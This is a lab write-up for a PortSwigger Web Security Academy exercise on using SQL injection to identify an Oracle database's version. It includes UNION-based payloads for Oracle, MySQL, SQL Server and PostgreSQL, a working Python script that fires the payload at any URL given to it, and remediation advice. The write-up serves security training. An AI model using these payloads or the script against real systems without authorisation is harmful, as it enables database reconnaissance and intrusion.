# SQL Injection Attack, Querying the Database Type and Version on Oracle
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-20

## The Problem
The application's product category filter ran a query similar to:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

Before extracting data from application-specific tables (like `users`), it's often useful to identify the exact database engine and version in use. Different databases have different syntax, system tables, and quirks — knowing the exact version narrows down which further injection techniques and payloads will actually work, and can reveal known vulnerabilities tied to that specific version.

## Discovery / Exploitation
Unlike MySQL (`@@version`) or PostgreSQL (`version()`), Oracle doesn't expose version info through a simple function call in a `SELECT`. Instead, it requires querying the special system view `v$version`, which returns version details in a column called `banner`:

```
' UNION SELECT banner, NULL FROM v$version--
```

Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT banner, NULL FROM v$version--'
```

`v$version` typically returns multiple rows (one for the core database, others for related components), so the response is scanned specifically for the row containing "Oracle Database" to isolate the relevant version string.

## Impact
This step doesn't extract application data directly, but database fingerprinting is a standard part of building a more targeted attack — it confirms Oracle is in use (as opposed to another vendor), which determines exactly which syntax, system tables, and further injection techniques will apply in later stages.

## Proof of Concept (Python)
This script sends the `v$version` UNION payload through Burp Suite (`127.0.0.1:8080`), then uses BeautifulSoup with a regex search to locate and print the specific line containing the Oracle Database version string.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_version(url):
    path = '/filter?category=Gifts'
    sql_payload = "'+UNION+select+banner,NULL+from+v$version--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if 'Oracle Database' in res:
        print('[+] found the database version')
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(string=re.compile(r'.*Oracle\sDatabase.*'))
        print("[+] Oracle database version is: " + version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the version of database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version")
```

**How it works:**
1. Takes the target URL as a command-line argument
2. Sends a `UNION SELECT banner, NULL FROM v$version` payload to the vulnerable `category` parameter — note the column order matches the string-compatible column identified in earlier reconnaissance (lab 4-style probing)
3. Checks whether the response contains "Oracle Database", confirming both the injection worked and the engine is Oracle
4. Uses a regex search to isolate the specific line with the full version string and prints it
5. Reports failure if no matching version string was found

**Example run:**
```bash
python3 exploit_sqli_db_version_oracle.py https://your-lab-url.web-security-academy.net
```

**Note:** Equivalent payloads for other engines:
- **MySQL / Microsoft SQL Server:** `' UNION SELECT NULL, @@version--`
- **PostgreSQL:** `' UNION SELECT NULL, version()--`

Trying these three in order (and watching for which one avoids an error) is a reliable way to fingerprint the database engine before knowing it in advance.

## Remediation
- Use **parameterized queries (prepared statements)** — prevents any injection at all, including reconnaissance-only payloads like this one.
- Avoid exposing **detailed error messages or version banners** to end users through any application feature, not just injection points.
- Apply the **principle of least privilege** to the database account used by the application, restricting access to system views like `v$version` where not required.

## Takeaway
Database fingerprinting via `UNION SELECT` against system tables/views is a standard reconnaissance step once basic UNION injection is confirmed. Each database engine exposes version info differently (`@@version`, `version()`, `v$version`), so recognizing which syntax succeeds is itself informative — a working payload for one engine failing while another succeeds is enough to identify the underlying database without needing to see version output at all.
